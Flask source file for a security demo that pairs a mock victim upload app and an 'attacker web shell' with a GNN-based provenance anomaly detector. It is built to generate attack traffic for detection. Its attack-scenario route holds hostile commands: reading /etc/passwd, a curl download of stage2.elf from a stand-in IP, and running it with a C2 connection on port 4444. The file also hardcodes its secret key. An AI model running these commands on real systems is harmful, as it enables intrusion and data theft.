import json
import time
import queue
import threading
from pathlib import Path
from typing import Generator
from flask import Flask, render_template, request, jsonify, Response, redirect, url_for

from koton.config import FLASK_HOST, FLASK_PORT, SSE_PING_INTERVAL_SEC
from koton.pipeline.streaming_engine import StreamingProvenanceEngine
from koton.pipeline.detector import RealTimeGNNAnomalyDetector
from koton.pipeline.audit_streamer import LinuxAuditWatcher
from koton.attacks.attack_scenarios import AttackSimulator
from koton.data.generator import SyntheticDarpaTcGenerator
from koton.data.schema import FileNode, ProcessNode, ProvenanceEvent

# Initialize Flask app
TEMPLATE_DIR = Path(__file__).resolve().parent / "templates"
STATIC_DIR = Path(__file__).resolve().parent / "static"

app = Flask(
    __name__,
    template_folder=str(TEMPLATE_DIR),
    static_folder=str(STATIC_DIR)
)
app.secret_key = "koton-secret-key-security-gnn"

# Global Singletons
engine = StreamingProvenanceEngine()
detector = RealTimeGNNAnomalyDetector(engine=engine)
attack_sim = AttackSimulator(engine=engine)
audit_watcher = LinuxAuditWatcher(engine=engine)

# Populate initial baseline system activity
gen = SyntheticDarpaTcGenerator(start_time=time.time() - 10.0, seed=123)
base_procs, base_files, base_socks, base_events = gen.generate_timeline(total_events=35)
for p in base_procs.values(): engine.add_process(p)
for f in base_files.values(): engine.add_file(f)
for s in base_socks.values(): engine.add_socket(s)
for ev in base_events: engine.push_event(ev)


# ==========================================
# Routes: Landing & Window Views
# ==========================================

@app.route("/")
def index():
    """Main Hub Portal."""
    return render_template("hub.html")


@app.route("/split")
def split_view():
    """Unified 3-Window Split Screen."""
    return render_template("split_view.html")


@app.route("/app", methods=["GET", "POST"])
def victim_app():
    """Window 1: Target Web Application (File upload board & user profile)."""
    upload_msg = None
    is_vulnerable = False
    filename = None

    if request.method == "POST" and "file" in request.files:
        f = request.files["file"]
        if f.filename:
            filename = f.filename
            t = time.time()
            f_key = f"file:/app/uploads/{filename}"
            is_malicious = filename.lower().endswith((".sh", ".elf", ".php", ".py", ".bin", ".pl"))
            is_vulnerable = is_malicious

            if is_malicious:
                upload_msg = f"Critical alert: Uploaded '{filename}' triggered executable script alert!"
            else:
                upload_msg = f"Successfully uploaded and verified document: '{filename}'."

            # Inject file node
            fnode = FileNode(
                key=f_key,
                path=f"/app/uploads/{filename}",
                extension=Path(filename).suffix,
                timestamp=t,
                label=1 if is_malicious else 0,
                is_anomaly=is_malicious
            )
            engine.add_file(fnode)

            # Inject provenance event: web server writes uploaded file
            engine.push_event(ProvenanceEvent(
                timestamp=t,
                src_type="process",
                src_key="proc:1024:python_web",
                relation="write",
                dst_type="file",
                dst_key=f_key,
                is_attack=is_malicious,
                metadata={"filename": filename, "is_vulnerable": is_malicious}
            ))

    return render_template(
        "victim_app.html",
        upload_msg=upload_msg,
        is_vulnerable=is_vulnerable,
        last_uploaded_file=filename
    )


@app.route("/terminal")
def terminal():
    """Window 2: Attacker Web Shell interface."""
    return render_template("terminal.html")


@app.route("/dashboard")
def dashboard():
    """Window 3: 3D Force-Directed Causal Graph SOC Dashboard."""
    return render_template("dashboard.html")


# ==========================================
# API Endpoints
# ==========================================

@app.route("/api/terminal/exec", methods=["POST"])
def api_terminal_exec():
    """Executes exploit commands from Window 2 and injects into GNN pipeline."""
    data = request.get_json() or {}
    cmd = data.get("command", "")
    result = attack_sim.execute_command(cmd)
    return jsonify(result)


@app.route("/api/attacks/run", methods=["POST"])
def api_run_attacks():
    """
    Triggers automated attack scenarios:
    'recon', 'cred_dump', 'dropper', 'privesc_c2', 'full'
    """
    data = request.get_json() or {}
    scenario = data.get("scenario", "full")

    if scenario == "full":
        results = attack_sim.run_full_kill_chain()
        return jsonify({"status": "ok", "scenario": "full_kill_chain", "results": results})
    elif scenario == "recon":
        res = attack_sim.execute_command("whoami && id && uname -a")
        return jsonify({"status": "ok", "scenario": "recon", "result": res})
    elif scenario == "cred_dump":
        res = attack_sim.execute_command("cat /etc/passwd")
        return jsonify({"status": "ok", "scenario": "cred_dump", "result": res})
    elif scenario == "dropper":
        res = attack_sim.execute_command("curl -s http://198.51.100.42:8080/stage2.elf -o /tmp/stage2.elf")
        return jsonify({"status": "ok", "scenario": "dropper", "result": res})
    elif scenario == "privesc_c2":
        res = attack_sim.execute_command("chmod +x /tmp/stage2.elf && /tmp/stage2.elf --connect 198.51.100.42:4444")
        return jsonify({"status": "ok", "scenario": "privesc_c2", "result": res})

    return jsonify({"status": "error", "message": f"Unknown scenario: {scenario}"}), 400


@app.route("/api/traffic/benign", methods=["POST"])
def api_generate_benign():
    """Generates normal web, auth, and user activity."""
    for _ in range(2):
        gen.generate_benign_event()
        ev = gen.events[-1]
        engine.push_event(ev)
    return jsonify({"status": "ok", "events_added": 2})


@app.route("/api/config/threshold", methods=["POST"])
def api_set_threshold():
    """Interactive threshold slider adjustment from Window 3."""
    data = request.get_json() or {}
    val = float(data.get("threshold", 0.65))
    detector.set_threshold(val)
    return jsonify({"status": "ok", "threshold": detector.threshold})


@app.route("/api/graph/reset", methods=["POST"])
def api_reset_graph():
    """Resets anomalies and reloads baseline."""
    with engine.lock:
        engine.event_queue.clear()
        engine.processes.clear()
        engine.files.clear()
        engine.sockets.clear()
    # Re-seed baseline
    g = SyntheticDarpaTcGenerator(start_time=time.time() - 10.0, seed=int(time.time()))
    bp, bf, bs, be = g.generate_timeline(total_events=25)
    for p in bp.values(): engine.add_process(p)
    for f in bf.values(): engine.add_file(f)
    for s in bs.values(): engine.add_socket(s)
    for ev in be: engine.push_event(ev)
    return jsonify({"status": "ok", "message": "Graph reset to clean baseline"})


@app.route("/api/graph/state", methods=["GET"])
def api_graph_state():
    """Returns static JSON snapshot of the graph."""
    state = detector.evaluate_current_window()
    return jsonify(state)


@app.route("/api/stream")
def api_stream():
    """Server-Sent Events (SSE) streaming real-time graph updates to Window 3."""
    def event_stream() -> Generator[str, None, None]:
        while True:
            try:
                state = detector.evaluate_current_window()
                payload = json.dumps(state)
                yield f"data: {payload}\n\n"
            except Exception as e:
                yield f"data: {{\"error\": \"{str(e)}\"}}\n\n"
            time.sleep(SSE_PING_INTERVAL_SEC)

    return Response(
        event_stream(),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no"
        }
    )


def start_server(host: str = FLASK_HOST, port: int = FLASK_PORT, debug: bool = False):
    # Start live Linux auditd tailer if available
    audit_watcher.start()

    print(f"\n==================================================================")
    print(f"[*] KoTon Real-Time Security Detection Engine Online!")
    print(f"[*] Hub:        http://localhost:{port}/")
    print(f"[*] Split View: http://localhost:{port}/split      (Unified 3-Screen Live)")
    print(f"[*] Window 1:   http://localhost:{port}/app        (Victim Web App)")
    print(f"[*] Window 2:   http://localhost:{port}/terminal   (Attacker Web Shell)")
    print(f"[*] Window 3:   http://localhost:{port}/dashboard  (3D Causal Graph)")
    print(f"==================================================================\n")
    try:
        app.run(host=host, port=port, debug=debug, threaded=True)
    finally:
        audit_watcher.stop()


if __name__ == "__main__":
    start_server()
